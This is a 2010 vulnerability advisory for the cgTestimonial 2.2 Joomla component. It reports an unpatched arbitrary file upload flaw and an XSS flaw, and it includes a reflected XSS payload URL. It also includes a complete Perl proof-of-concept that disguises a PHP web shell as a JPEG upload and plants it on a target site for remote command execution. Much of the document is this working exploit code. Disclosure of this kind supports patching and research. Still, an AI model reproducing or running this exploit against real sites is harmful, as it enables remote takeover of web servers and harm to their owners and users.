@@ -1,0 +1,155 @@
+cgTestimonial 2.2 Joomla Component Multiple Remote Vulnerabilities
+
+ Name              cgTestimonial
+ Vendor            http://www.cmsgalaxy.com
+ Versions Affected 2.2
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-08-06
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+cg_Testimonial   component   is   a  tool   for   adding
+testimonial  by  the user from frontend and managing and
+publishing testimonials from backend.
+This  Joomla  extension  allows website user to submit a
+testimonials  form  with  several  fields on one of your
+site's  page  and enable  adding  testimonials by either
+users or admin.
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters are not properly sanitised.The following
+vulnerabilities can be exploited from guest users.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple Arbitrary File Upload
+ B) XSS
+ 
+
+A) Multiple Arbitrary File Upload
+_________________________________
+
+The  usr_img  parameter  in cgtestimonial.php (frontend)
+and in testimonial.php  (admin, without checks)  is  not
+properly sanitised. A check  is executed on the content-
+type HTTP field.
+
+
+B) XSS
+______
+
+The url parameter in video.php is not properly sanitised
+before being printed on screen.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple Arbitrary File Upload
+
+http://poc.salvatorefresta.net/PoC-cgTestimonial2.2.pl.txt
+
+B) XSS
+
+http://site/path/components/com_cgtestimonial/video.php?url="><script>alert('xss');</script>
+
+
+V. FIX
+______
+
+No fix.
+
+################################ PoC-cgTestimonial2.2.pl ################################
+
+#!/usr/bin/perl
+#
+# PoC - Remote PHP Shell Upload - cgTestimonial 2.2 Joomla Component
+#
+# Author: Salvatore Fresta aka Drosophila
+# Email:  salvatorefresta@gmail.com
+#
+# Date: 06 August 2010
+#
+# http://target/path/components/com_cgtestimonial/user_images/filename?cmd=command
+#
+
+use IO::Socket;
+
+
+$usage = "\ncgTestimonial 2.2 Remote PHP Shell Upload - (c) Salvatore Fresta\n".
+         "http://www.salvatorefresta.net\n\n".
+         "Usage: perl PoC-cgTestimonial.pl <hostname> <path>\n\n";
+
+$#ARGV == 1 || die $usage;
+
+my $host      = $ARGV[0];
+my $path      = $ARGV[1];
+
+my $stop      = 0;
+my $rand      = "master".int(rand 150);
+my $shell     = "<?php echo \"<pre>\"; system(\$_GET['cmd']); echo \"</pre>\"; ?>";
+my $filename  = "evil.php";
+
+my $code      = "--AaB03x\r\n".
+                "Content-Disposition: form-data; name=\"usr_img\"; filename=\"$filename\"\r\n".
+                "Content-Type: image/jpeg\r\n".
+                "\r\n".
+                "$shell\r\n".
+                "--AaB03x--";
+
+my $pkg       = "POST ".$path."index.php?option=com_cgtestimonial&task=submit HTTP/1.1\r\n".
+                "Host: $host\r\n".
+                "Content-Type: multipart/form-data; boundary=AaB03x\r\n".
+                "Content-Length: " .length($code). "\r\n".
+                "\r\n".
+                $code;
+
+my $socket = new IO::Socket::INET( Proto=> "tcp",
+                                   PeerAddr=> $host,
+                                   PeerPort=> "80"
+                                  ) or die "\n[-] Unable to connect to $host\n\n";
+
+print "\n[+] Connected\n";
+print $socket $pkg;
+
+$pkg = "GET ".$path."components/com_cgtestimonial/user_images/".$filename." HTTP/1.1\r\n".
+       "Host: $host\r\n\r\n";
+
+print $socket $pkg;
+
+while ((my $rec = <$socket>) && $stop != 1) {
+  if($rec !=~ /302 Found/) {
+    $stop = 1;
+  }
+}
+
+if($stop != 1) {
+  print "[-] Shell not uploaded\n";
+  close($socket);
+  exit;
+}
+
+print "[+] Shell uploaded on ".$host.$path."components/com_cgtestimonial/user_images/".$filename."\n".
+      "[+] Disconnected\n\n";
+
+close($socket);
